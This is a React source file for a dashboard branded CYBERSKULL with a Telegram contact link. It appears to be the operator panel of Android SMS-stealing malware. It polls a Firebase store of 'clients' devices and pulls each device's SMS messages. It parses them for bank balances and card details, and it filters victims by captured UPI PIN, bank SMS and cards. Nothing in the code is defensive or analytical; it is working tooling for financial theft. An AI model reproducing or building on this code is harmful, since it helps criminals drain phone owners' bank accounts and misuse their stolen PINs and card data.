import { useState, useEffect, useRef, useCallback } from 'react'
import {
  Shield, Wifi, Search, Clock, LogOut, RefreshCw, IndianRupee, CreditCard, Zap, X
} from '../icons'
import { firebaseGet, loadDeviceMessages } from '../utils/firebase'
import { parseDevices, extractMessages, analyzeMessages, relativeTime } from '../utils/smsParser'
import { loadDeviceMeta } from '../utils/telegramBot'
import DeviceCard from './DeviceCard'
import DeviceDetailPanel from './DeviceDetailPanel'
import ErrorBanner from './ErrorBanner'
import SkeletonLoader from './SkeletonLoader'

export default function Dashboard({ fbUrl, fbKey, onLogout }) {
  const [devices, setDevices] = useState([])
  const [loading, setLoading] = useState(true)
  const [initialLoad, setInitialLoad] = useState(false)
  const [selectedDev, setSelectedDev] = useState(null)
  const [filter, setFilter] = useState('all')
  const [sort, setSort] = useState('new')
  const [search, setSearch] = useState('')
  const [errorMsg, setErrorMsg] = useState('')
  const [toast, setToast] = useState('')
  const [updateTime, setUpdateTime] = useState(new Date())
  const prevCount = useRef(0)
  const pollRef = useRef(null)
  const smsPollRef = useRef(null)
  const analyzedRef = useRef(new Set())

  const showToast = useCallback(msg => {
    setToast(msg)
    setTimeout(() => setToast(''), 3500)
  }, [])

  const analyzeDeviceSms = useCallback(async (devId, devData) => {
    try {
      const msgs = await loadDeviceMessages(fbUrl, fbKey, devId)
      const result = analyzeMessages(msgs)
      setDevices(prev => prev.map(d => d.id === devId ? { ...d, smsAnalysis: result } : d))
      setSelectedDev(prev => prev?.id === devId ? { ...prev, smsAnalysis: result } : prev)
      analyzedRef.current.add(devId)
    } catch {
      analyzedRef.current.add(devId)
    }
    return devData
  }, [fbUrl, fbKey])

  const fetchDevices = useCallback(async (silent = false) => {
    try {
      const data = await firebaseGet(fbUrl, fbKey, 'clients')
      const parsed = parseDevices(data)
      setDevices(prev => {
        const map = new Map(prev.map(d => [d.id, d]))
        return parsed.map(d => {
          const meta = loadDeviceMeta(d.id)
          return { ...d, smsAnalysis: map.get(d.id)?.smsAnalysis, pinned: meta?.pinned || false }
        })
      })
      setErrorMsg('')
      setLoading(false)
      const newIds = parsed.map(d => d.id).filter(id => !analyzedRef.current.has(id))
      if (newIds.length > 0) {
        if (!silent) setInitialLoad(true)
        const batches = []
        for (let i = 0; i < newIds.length; i += 5) batches.push(newIds.slice(i, i + 5))
        for (const batch of batches) {
          const batchDevs = parsed.filter(d => batch.includes(d.id))
          await Promise.all(batch.map((id, idx) => analyzeDeviceSms(id, batchDevs[idx])))
        }
        if (!silent) setInitialLoad(false)
      }
      if (prevCount.current > 0 && parsed.length > prevCount.current) {
        showToast('New device connected!')
      }
      prevCount.current = parsed.length
    } catch (err) {
      setLoading(false)
      const msg = err instanceof Error ? err.message : String(err)
      if (msg.includes('PERMISSION_DENIED') || msg.includes('401') || msg.includes('403')) {
        setErrorMsg('Firebase Permission Denied')
      } else if (msg.includes('NOT_FOUND') || msg.includes('404')) {
        setErrorMsg('Database path not found.')
      } else {
        setErrorMsg('Connection error: ' + msg.slice(0, 120))
      }
    }
  }, [fbUrl, fbKey, analyzeDeviceSms, showToast])

  const refreshSms = useCallback(async () => {
    const current = devices
    if (current.length === 0) return
    for (let i = 0; i < current.length; i += 5) {
      const batch = current.slice(i, i + 5)
      await Promise.all(batch.map(d => analyzeDeviceSms(d.id, d)))
    }
  }, [devices, analyzeDeviceSms])

  useEffect(() => {
    fetchDevices(false)
    pollRef.current = setInterval(() => fetchDevices(true), 15000)
    smsPollRef.current = setInterval(refreshSms, 45000)
    const timeInterval = setInterval(() => setUpdateTime(new Date()), 1000)
    return () => {
      if (pollRef.current) clearInterval(pollRef.current)
      if (smsPollRef.current) clearInterval(smsPollRef.current)
      clearInterval(timeInterval)
    }
  }, [])

  const handleLogout = () => {
    if (confirm('Logout from current account?')) onLogout()
  }

  const handleSelectDevice = (dev) => setSelectedDev(dev)

  const filtered = devices.filter(d => {
    if (filter === 'online' && !d.status) return false
    if (filter === 'offline' && d.status) return false
    if (filter === 'upi' && !d.upipin) return false
    if (filter === 'bank' && !d.smsAnalysis?.bankBalances.length) return false
    if (filter === 'card' && !d.smsAnalysis?.cards.length) return false
    const q = search.toLowerCase()
    return !(q && !d.name.toLowerCase().includes(q) && !d.phoneNumber.includes(q) && !d.id.includes(q))
  }).sort((a, b) => {
    if (a.pinned && !b.pinned) return -1
    if (!a.pinned && b.pinned) return 1
    if (sort === 'name') return a.name.localeCompare(b.name)
    if (sort === 'battery') return b.batteryPercent - a.batteryPercent
    if (sort === 'old') return a.id.localeCompare(b.id)
    return b.id.localeCompare(a.id)
  })

  const onlineCount = devices.filter(d => d.status).length
  const offlineCount = devices.length - onlineCount
  const bankCount = devices.filter(d => d.smsAnalysis?.bankBalances?.length).length
  const cardCount = devices.filter(d => d.smsAnalysis?.cards?.length).length
  const timeStr = updateTime.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: false })

  return (
    <div className="min-h-screen bg-[#04050a] text-white flex flex-col">
      <header className="sticky top-0 z-40 bg-[#080914]/95 backdrop-blur-md border-b border-[#14172b]">
        <div className="max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-4">
            <div className="flex items-center gap-2.5 flex-shrink-0">
              <div className="w-8 h-8 rounded-full bg-gradient-to-br from-cyan-500 to-purple-500 flex items-center justify-center shadow-lg shadow-cyan-900/50 p-[1px]">
                <img src="/logo.png" alt="Cyber Skull" className="w-full h-full rounded-full object-cover bg-black" />
              </div>
              <span className="font-bold text-lg tracking-tight"><span className="text-[#00f0ff]">CYBER</span><span className="text-[#b026ff]">SKULL</span></span>
            </div>
          <div className="relative flex-1 max-w-sm">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#444]" />
            <input type="text" value={search} onChange={e => setSearch(e.target.value)} placeholder="Search devices..."
              className="w-full pl-9 pr-4 py-2 rounded-xl bg-[#0e1021] border border-[#1b1f3d] focus:border-[#00f0ff]/50 outline-none text-sm text-white placeholder:text-[#445] transition-all" />
          </div>
          <div className="ml-auto flex items-center gap-3">
            <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-950/40 border border-emerald-900/40">
              <span className="w-2 h-2 rounded-full bg-emerald-500" style={{ boxShadow: '0 0 6px #22c55e' }} />
              <span className="text-xs font-semibold text-emerald-400">Connected</span>
            </div>
            <a href="https://t.me/BERLIN_00_11" target="_blank" rel="noopener noreferrer" className="inline-block">
              <span className="inline-block" style={{ display: 'inline-block', padding: '4px', borderRadius: '50%', boxShadow: '0 0 6px #00bfff, 0 0 10px #0088cc' }}>
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" fill="#0088cc" className="w-8 h-8">
                  <path d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm56.1 83.1l-21.3 100.5c-1.6 7.1-5.8 8.9-11.7 5.5l-32.4-24.1-15.7 15.1c-1.7 1.7-3.1 3.1-6.3 3.1l2.3-32.5 59.2-53.5c2.6-2.3-0.6-3.6-4.1-1.3l-72.9 46.1-31.4-9.8c-6.8-2.1-6.9-6.8 1.4-10.1l121.5-46.7c5.6-2.1 10.5 1.3 8.9 9.1z" />
                </svg>
              </span>
            </a>
            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-[#111] border border-[#1e1e1e]">
              <Clock className="w-3.5 h-3.5 text-[#555]" />
              <span className="text-xs font-mono font-bold text-[#888]">{timeStr}</span>
            </div>
            <button onClick={handleLogout} className="flex items-center gap-2 px-3 py-1.5 rounded-xl border border-[#222] bg-[#111] text-xs text-[#666] hover:text-red-400 hover:border-red-900/40 transition-all">
              <LogOut className="w-3.5 h-3.5" />Logout
            </button>
          </div>
        </div>
      </header>
      {errorMsg && <ErrorBanner message={errorMsg} onDismiss={() => setErrorMsg('')} />}
      <div className="border-b border-[#14172b] bg-[#080914]">
        <div className="max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-6 flex-wrap">
          <div className="flex items-center gap-5">
            <div><p className="text-[9px] uppercase tracking-widest text-[#444] font-semibold">Total</p><p className="text-lg font-black text-white">{devices.length}</p></div>
            <div><p className="text-[9px] uppercase tracking-widest text-[#444] font-semibold">Online</p><p className="text-lg font-black text-emerald-400">{onlineCount}</p></div>
            <div><p className="text-[9px] uppercase tracking-widest text-[#444] font-semibold">Offline</p><p className="text-lg font-black text-[#555]">{offlineCount}</p></div>
            <div><p className="text-[9px] uppercase tracking-widest text-[#444] font-semibold">Bank SMS</p><p className="text-lg font-black text-emerald-400">{bankCount}</p></div>
            {cardCount > 0 && <div><p className="text-[9px] uppercase tracking-widest text-[#444] font-semibold">Cards</p><p className="text-lg font-black text-purple-400">{cardCount}</p></div>}
          </div>
          <div className="ml-auto flex items-center gap-2 flex-wrap">
            {['all', 'online', 'offline', 'upi', 'bank', 'card'].map(f => (
              <button key={f} onClick={() => setFilter(f)}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all cursor-pointer ${
                  filter === f
                    ? f === 'bank' ? 'bg-emerald-600/20 text-emerald-400 border border-emerald-600/30'
                      : f === 'card' ? 'bg-purple-600/20 text-purple-400 border border-purple-600/30'
                      : 'bg-cyan-600/20 text-cyan-400 border border-cyan-600/30'
                    : 'text-[#555] hover:text-[#888] hover:bg-white/5'
                }`}>{f}</button>
            ))}
            <div className="w-px h-4 bg-[#222]" />
            <select value={sort} onChange={e => setSort(e.target.value)}
              className="bg-[#111] border border-[#222] text-xs text-[#666] rounded-lg px-2 py-1.5 outline-none cursor-pointer">
              <option value="new">Newest</option><option value="old">Oldest</option>
              <option value="name">Name</option><option value="battery">Battery</option>
            </select>
            <button onClick={() => fetchDevices(false)}
              className="p-2 rounded-lg bg-[#111] border border-[#222] text-[#555] hover:text-[#888] hover:border-[#333] transition-all cursor-pointer">
              <RefreshCw className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </div>
      <main className="flex-1 max-w-screen-2xl mx-auto w-full px-6 py-6">
        {loading ? (
          <div>
            <div className="flex items-center gap-3 mb-5">
              <div className="w-4 h-4 border-2 border-[#333] border-t-cyan-500 rounded-full animate-spin" />
              <span className="text-sm text-[#555]">Connecting to Firebase…</span>
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4">
              {Array.from({ length: 6 }).map((_, i) => <SkeletonLoader key={i} />)}
            </div>
          </div>
        ) : devices.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-24 text-center">
            <div className="w-16 h-16 rounded-2xl bg-[#111] border border-[#1e1e1e] flex items-center justify-center mb-5">
              <Shield className="w-8 h-8 text-[#2a2a2a]" />
            </div>
            <p className="text-base font-bold text-[#444]">No devices connected</p>
            <p className="text-sm text-[#333] mt-1.5 mb-5">Waiting for devices to register…</p>
          </div>
        ) : filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-24 text-center">
            <Search className="w-10 h-10 text-[#2a2a2a] mb-4" />
            <p className="text-base font-bold text-[#444]">No devices match filter</p>
          </div>
        ) : (
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4">
            {filtered.map(dev => <DeviceCard key={dev.id} dev={dev} onClick={() => handleSelectDevice(dev)} />)}
          </div>
        )}
      </main>
      {selectedDev && (
        <DeviceDetailPanel
          dev={selectedDev}
          fbUrl={fbUrl}
          fbKey={fbKey}
          onClose={() => setSelectedDev(null)}
          onDelete={() => {
            setDevices(prev => prev.filter(d => d.id !== selectedDev.id))
            setSelectedDev(null)
          }}
          showToast={showToast}
        />
      )}
      {toast && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 z-50 px-5 py-3 rounded-2xl bg-[#1a1a1a] border border-[#2a2a2a] text-sm font-semibold text-white shadow-xl animate-fade-up flex items-center gap-2">
          <Zap className="w-4 h-4 text-orange-400" />
          {toast}
        </div>
      )}
    </div>
  )
}
